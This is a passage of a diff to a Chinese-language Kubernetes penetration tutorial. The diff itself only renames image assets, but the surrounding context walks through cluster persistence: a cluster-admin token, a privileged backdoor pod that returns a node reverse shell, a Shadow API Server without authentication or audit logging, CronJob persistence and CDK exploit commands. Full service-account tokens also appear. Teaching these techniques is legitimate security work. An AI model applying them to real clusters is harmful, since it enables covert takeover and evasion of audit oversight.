 eyJhbGciOiJSUzI1NiIsImtpZCI6Iml3OVRtaVlnREpPQ0h2ZlUwSDBleFlIc29qcXgtTmtaUFN4WDk4NjZkV1EifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJrdWJlcm5ldGVzLWRhc2hib2FyZC10b2tlbi04a3huaCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6ImMyYTE0NTAzLTc4MzgtNGY3MS1iOTBjLTFhMWJkOTk4NGFiMiIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlcm5ldGVzLWRhc2hib2FyZDprdWJlcm5ldGVzLWRhc2hib2FyZCJ9.bQOXikheuY7kL0Dki0mLmyVvGT9cDc4HvdUWXPRywjFPCZNeX6mMurU6pr9LJR25MFwF4Y3ZlnGzHDbrGR-bYRLwDsSvX-qvh0BLCZhQORE2gfd971lCQc7uoyrkf-EJrg26_0C2yGGhZI7JdcRDjrjuHG0aZpQ1vNZYrIWwj5hj9yn7xVI0-dVLbjx8_1kmRXIKw5dk3c_x8aKh-fLSZ-ncpMBf35GGisUHzsdPWup_fqoQKZr4TcEMYc2FcooDQ_mnhBL-WVTbHM9z-LEcebTaCepYR7f-655nRXrDWQe3H524Vvak9aEHI9xK8qHWk1546ka14fMsYTqi3Ra-Tg
 ```
 
 Step 10：使用默认用户的token登录  
-[![](assets/1698893217-f33fbed224eabb834a623c59936c1fd3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142918-2856dac8-7492-1.png)  
+[![](assets/1701606868-f33fbed224eabb834a623c59936c1fd3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142918-2856dac8-7492-1.png)  
 之后发现权限略有不足：  
-[![](assets/1698893217-4c82f98b8fa4074537a98ba61f4de267.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142932-30581aa2-7492-1.png)  
+[![](assets/1701606868-4c82f98b8fa4074537a98ba61f4de267.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142932-30581aa2-7492-1.png)  
 Step 11：新建管理员  
 a、创建serviceaccount
 
@@ -764,14 +764,14 @@ kubectl create clusterrolebinding  dashboard-cluster-admin --clusterrole=cluster
 kubectl get sa,secrets -n kubernetes-dashboard
 ```
 
-[![](assets/1698893217-c55fee78364db6c3ace9752016a851e2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143020-4d641a06-7492-1.png)  
+[![](assets/1701606868-c55fee78364db6c3ace9752016a851e2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143020-4d641a06-7492-1.png)  
 c、查看token
 
 ```plain
 kubectl describe secret admin-myuser-token-jcj9d -n kubernetes-dashboard
 ```
 
-[![](assets/1698893217-9794f312303f318219e16480dbe0e4d0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143044-5b7b8ae8-7492-1.png)
+[![](assets/1701606868-9794f312303f318219e16480dbe0e4d0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143044-5b7b8ae8-7492-1.png)
 
 ```plain
 eyJhbGciOiJSUzI1NiIsImtpZCI6Iml3OVRtaVlnREpPQ0h2ZlUwSDBleFlIc29qcXgtTmtaUFN4WDk4NjZkV1EifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi1teXVzZXItdG9rZW4tamNqOWQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiYWRtaW4tbXl1c2VyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYjM5MjBlZWEtMzA1NS00ZDQzLWEyMWMtNDk4MDEwM2NhMjhmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmVybmV0ZXMtZGFzaGJvYXJkOmFkbWluLW15dXNlciJ9.DC1dSWMY46GzOZiSDsQWjO2dNIQ6ZsO_KDDfWjJ74m8ugPoklduiPeLj85n2NI03NKzCpXOaRRUR4LZHHT5KrpKFTsA9uPQyC0Lb3vi-UUZuQ4uhAZrzOxHx82tIcgNBSv-hXvIZytSrgm3RaItH20O3D-3NTEPt00ohD54cq6FyQPBqGi5yseLlTKj4Z2exbCCHxie67ID8ykaNnwcC8Ay1Ccznlvqu8ffdTejrcqFEyGZqHW3NuBxtYGkh_THdZIGHxaeqgLlGb7i2SbOr3IPeQGlf9l-rRKFSIMqvK_0SFBM9BiA0A4lEv26ro2LC4_PxF6o5_QOAz7X0E65hfw
@@ -779,8 +779,8 @@ eyJhbGciOiJSUzI1NiIsImtpZCI6Iml3OVRtaVlnREpPQ0h2ZlUwSDBleFlIc29qcXgtTmtaUFN4WDk4
 
 Step 12：登录dashboard
 
-[![](assets/1698893217-df80189e2a5d086fc70203ff1f315408.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143101-656ae2a6-7492-1.png)  
-[![](assets/1698893217-4a6619e28a3ee08c9cf0b42ed3c77a5e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143107-693c1738-7492-1.png)  
+[![](assets/1701606868-df80189e2a5d086fc70203ff1f315408.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143101-656ae2a6-7492-1.png)  
+[![](assets/1701606868-4a6619e28a3ee08c9cf0b42ed3c77a5e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143107-693c1738-7492-1.png)  
 随后可以进行逃逸等操作，具体看上篇，这里不再赘述
 
 ## 权限维持
@@ -836,7 +836,7 @@ spec:
           type: Directory
 ```
 
-[![](assets/1698893217-b23ccab3d47b7c26d0134cd7cdf9b2ec.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143226-983ed94e-7492-1.png)  
+[![](assets/1701606868-b23ccab3d47b7c26d0134cd7cdf9b2ec.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143226-983ed94e-7492-1.png)  
 Step 2：使用kubectl来创建后门Pod
 
 ```plain
@@ -844,16 +844,16 @@ Step 2：使用kubectl来创建后门Pod
 kubectl create -f dep.yaml
 ```
 
-[![](assets/1698893217-fd35a85ff6d22cb77d95a6150de9fce4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143242-a1edd04e-7492-1.png)  
+[![](assets/1701606868-fd35a85ff6d22cb77d95a6150de9fce4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143242-a1edd04e-7492-1.png)  
 Step 3：成功反弹shell回来，且为节点的shell  
-[![](assets/1698893217-143844978aa982c16b51a8caa1e56921.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143252-a7a1dbf2-7492-1.png)  
+[![](assets/1701606868-143844978aa982c16b51a8caa1e56921.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143252-a7a1dbf2-7492-1.png)  
 Step 4：查看当前权限发现属于特权模式
 
 ```plain
 cat /proc/self/status | grep CapEff
 ```
 
-[![](assets/1698893217-b01c70b008dbb47aadf4986620e4aeba.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143308-b1540c24-7492-1.png)  
+[![](assets/1701606868-b01c70b008dbb47aadf4986620e4aeba.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143308-b1540c24-7492-1.png)  
 Step 6：之后切换至host目录下可以看到成功挂载宿主机目录
 
 ```plain
@@ -861,14 +861,14 @@ cd host
 cd home
 ```
 
-[![](assets/1698893217-95b9c461accf088245ef8e8ae50f9ede.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143328-bd83a824-7492-1.png)  
+[![](assets/1701606868-95b9c461accf088245ef8e8ae50f9ede.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143328-bd83a824-7492-1.png)  
 Step 7：删除pod
 
 ```plain
 kubectl delete -f dep.yaml
 ```
 
-[![](assets/1698893217-900b26f1ccdcd5009c4b804d3c933d0e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143346-c7f56450-7492-1.png)
+[![](assets/1701606868-900b26f1ccdcd5009c4b804d3c933d0e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143346-c7f56450-7492-1.png)
 
 #### 工具实现
 
@@ -884,14 +884,14 @@ Exploit Options:
 <image>: your backdoor image (you can upload it to dockerhub before)
 ```
 
-[![](assets/1698893217-18f4eddf02cb3e24c8a10475f9903ce1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143432-e3ab62b2-7492-1.png)
+[![](assets/1701606868-18f4eddf02cb3e24c8a10475f9903ce1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143432-e3ab62b2-7492-1.png)
 
 ### Shadow API利用
 
 #### 基本概述
 
 Shadow API Server攻击技术由安全研究人员Ian Coldwater在"Advanced Persistence Threats: The Future of Kubernetes Attacks"中首次提出，该攻击手法旨在创建一种针对K8S集群的隐蔽持续控制通道  
-[![](assets/1698893217-938bcda77f4f721b7931fda81773cce6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143542-0d27a4de-7493-1.png)  
+[![](assets/1701606868-938bcda77f4f721b7931fda81773cce6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143542-0d27a4de-7493-1.png)  
 Shadow API Server攻击技术的思路是创建一个具有API Server功能的Pod，后续命令通过新的"Shadow API Server"下发，新的API Server创建时可以开放更大权限，并放弃采集审计日志，且不影响原有API-Server功能，日志不会被原有API-Server记录，从而达到隐蔽性和持久控制目的
 
 #### 手动实现
@@ -902,14 +902,14 @@ Step 1：首先查看kube-system命名空间下的kube-apiserver信息
 kubectl get pods -n kube-system | grep kube-apiserver
 ```
 
-[![](assets/1698893217-d7cd9eb9a8c6f13bf3535d33e28ac023.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143604-1a52e7f4-7493-1.png)  
+[![](assets/1701606868-d7cd9eb9a8c6f13bf3535d33e28ac023.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143604-1a52e7f4-7493-1.png)  
 Step 2：查看kube-apiserver-master对应的YAML文件
 
 ```plain
 kubectl get pods -n kube-system kube-apiserver-master -o yaml
 ```
 
-[![](assets/1698893217-46886e59db9283e673137fba6ae30d87.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143625-2683002c-7493-1.png)  
+[![](assets/1701606868-46886e59db9283e673137fba6ae30d87.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143625-2683002c-7493-1.png)  
 Step 3：复制上述YAML内容并进行如下修改
 
 ```plain
@@ -1040,18 +1040,18 @@ Step 4：创建一个附加由API Server功能的pod
 kubectl create -f api.yaml
 ```
 
-[![](assets/1698893217-0e3fa2ddd1d1ebd9bf1d3854307cfccc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143803-615a65aa-7493-1.png)  
+[![](assets/1701606868-0e3fa2ddd1d1ebd9bf1d3854307cfccc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143803-615a65aa-7493-1.png)  
 Step 5：端口服务查看  
-[![](assets/1698893217-0e584f49848bdaac12a39d41c867db83.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143816-68f5296c-7493-1.png)  
+[![](assets/1701606868-0e584f49848bdaac12a39d41c867db83.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143816-68f5296c-7493-1.png)  
 Step 6：在浏览器中实现未授权访问测试  
-[![](assets/1698893217-977aefbe83150a9ce60bdced66bd3c13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143832-728c7c3c-7493-1.png)  
+[![](assets/1701606868-977aefbe83150a9ce60bdced66bd3c13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143832-728c7c3c-7493-1.png)  
 Step 7：在命令行中实现未授权访问
 
 ```plain
 kubectl -s http://192.168.17.144:9443 get nodes
 ```
 
-[![](assets/1698893217-d6cadc2b36648afbf103aaf5db1a8d94.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143848-7bca1b1a-7493-1.png)
+[![](assets/1701606868-d6cadc2b36648afbf103aaf5db1a8d94.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143848-7bca1b1a-7493-1.png)
 
 #### 工具实现
 
@@ -1061,19 +1061,19 @@ Step 1：在Pod中使用CDK寻找脆弱点
 cdk evaluate
 ```
 
-[![](assets/1698893217-29957193ca2b58d13ad0535ede63f296.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143918-8e200892-7493-1.png)  
+[![](assets/1701606868-29957193ca2b58d13ad0535ede63f296.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143918-8e200892-7493-1.png)  
 Step 2：发现当前Pod内置Service account具有高权限，接下来使用EXP部署Shadow API Server
 
 ```plain
 cdk run k8s-shadow-apiserver default
 ```
 
-[![](assets/1698893217-e1f36ef40732d9ea0cd99be57d5bf0a0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143937-9939be26-7493-1.png)  
+[![](assets/1701606868-e1f36ef40732d9ea0cd99be57d5bf0a0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143937-9939be26-7493-1.png)  
 Step 3：部署成功之后，后续渗透操作全部由新的Shadow API Server代理，由于打开了无鉴权端口，任何pod均可直接向Shadow API Server发起请求管理集群  
-[![](assets/1698893217-77f8a475af15b76324b5e01b006c3730.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143949-a01a2802-7493-1.png)  
+[![](assets/1701606868-77f8a475af15b76324b5e01b006c3730.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027143949-a01a2802-7493-1.png)  
 Step 4：获取K8s的Secrets凭据信息
 
-[![](assets/1698893217-3bf744c21a853524f196d120e7dece11.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144000-a725e4ce-7493-1.png)
+[![](assets/1701606868-3bf744c21a853524f196d120e7dece11.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144000-a725e4ce-7493-1.png)
 
 ### K8s CronJob
 
@@ -1107,16 +1107,16 @@ spec:
           restartPolicy: OnFailure
 ```
 
-[![](assets/1698893217-031e5df2c515c0af01994f8331bd6dca.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144042-bfe3c7ce-7493-1.png)  
+[![](assets/1701606868-031e5df2c515c0af01994f8331bd6dca.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144042-bfe3c7ce-7493-1.png)  
 Step 2：部署pod
 
 ```plain
 kubectl create -f cron.yaml
 ```
 
-[![](assets/1698893217-1d988b83ffd9213ff09b3301c8fd7b8c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144059-ca058eb8-7493-1.png)  
+[![](assets/1701606868-1d988b83ffd9213ff09b3301c8fd7b8c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144059-ca058eb8-7493-1.png)  
 Step 3：之后再监听端并未获取到shell  
-[![](assets/1698893217-9374ec96f4f94d43dae8a907714e5249.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144240-068d51ea-7494-1.png)  
+[![](assets/1701606868-9374ec96f4f94d43dae8a907714e5249.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144240-068d51ea-7494-1.png)  
 随后发现未反弹回shell的原因是因为IP网段问题，相关测试如下  
 Step 1：测试yaml文件
 
@@ -1142,7 +1142,7 @@ spec:
 ```
 
 Step 2：部署后查看logs  
-[![](assets/1698893217-6f3c78acdaec2c5b30f1885833583430.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144405-394634ee-7494-1.png)
+[![](assets/1701606868-6f3c78acdaec2c5b30f1885833583430.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144405-394634ee-7494-1.png)
 
 #### 工具实现
 
@@ -1173,10 +1173,10 @@ Exploit Options:
 ./cdk run k8s-cronjob default min alpine "echo hellow;echo cronjob"
 ```
 
-[![](assets/1698893217-be565b26aff5fccecd73bd802efc4491.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144443-4fe50482-7494-1.png)  
+[![](assets/1701606868-be565b26aff5fccecd73bd802efc4491.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144443-4fe50482-7494-1.png)  
 执行之后：
 
-[![](assets/1698893217-d7585697ded01929e186967041bdd0a2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144454-55ecd1d4-7494-1.png)
+[![](assets/1701606868-d7585697ded01929e186967041bdd0a2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144454-55ecd1d4-7494-1.png)
 
 ## 工具推荐
 
@@ -1185,31 +1185,31 @@ Exploit Options:
 Nebula是一个云和DevOps渗透测试框架，它为每个提供者和每个功能构建了模块，截至 2021年4月，它仅涵盖AWS，但目前是一个正在进行的项目，有望继续发展以测试GCP、Azure、Kubernetes、Docker或Ansible、Terraform、Chef等自动化引擎  
 [https://github.com/gl4ssesbo1/Nebula](https://github.com/gl4ssesbo1/Nebula)
 
-[![](assets/1698893217-51d7957c3cba751f0dbf2238a62f9bd2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027145025-1b2eecd4-7495-1.png)
+[![](assets/1701606868-51d7957c3cba751f0dbf2238a62f9bd2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027145025-1b2eecd4-7495-1.png)
 
 ### k0otkit
 
 k0otkit是一种通用的后渗透技术，可用于对Kubernetes集群的渗透，攻击者可以使用k0otkit快速、隐蔽和连续的方式(反向shell)操作目标Kubernetes集群中的所有节点，K0otkit使用到的技术主要有以下几个：
 
--   kube-proxy镜像(就地取材)
--   动态容器注入(高隐蔽性)
--   Meterpreter(流量加密)
--   无文件攻击(高隐蔽性)
+*   kube-proxy镜像(就地取材)
+*   动态容器注入(高隐蔽性)
+*   Meterpreter(流量加密)
+*   无文件攻击(高隐蔽性)
 
 DaemonSet和Secret资源(快速持续反弹、资源分离)  
-[![](assets/1698893217-a047c305429eb5c4b0eee1a3527f64ba.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027145158-52b182de-7495-1.png)
+[![](assets/1701606868-a047c305429eb5c4b0eee1a3527f64ba.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027145158-52b182de-7495-1.png)
 
 ### CDK Tools
 
 CDK是一款为容器环境定制的渗透测试工具，在已攻陷的容器内部提供零依赖的常用命令及PoC/EXP，集成Docker/K8s场景特有的逃逸、横向移动、持久化利用方式，插件化管理  
 [https://github.com/cdk-team/CDK](https://github.com/cdk-team/CDK)  
-[![](assets/1698893217-df6566676441465bdc03f4c9bd3691ea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144752-c01c8022-7494-1.png)
+[![](assets/1701606868-df6566676441465bdc03f4c9bd3691ea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144752-c01c8022-7494-1.png)
 
 ### Kubesploit:
 
 Kubesploit是一个功能强大的跨平台后渗透漏洞利用HTTP/2命令&控制服务器和代理工具，基于Merlin项目实现其功能，主要针对的是容器化环境的安全问题  
 [https://github.com/cyberark/kubesploit](https://github.com/cyberark/kubesploit)  
-[![](assets/1698893217-12da2565d27161116ab99ccb6145f0c8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144813-cd15504c-7494-1.png)
+[![](assets/1701606868-12da2565d27161116ab99ccb6145f0c8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027144813-cd15504c-7494-1.png)
 
 ## 参考链接
 
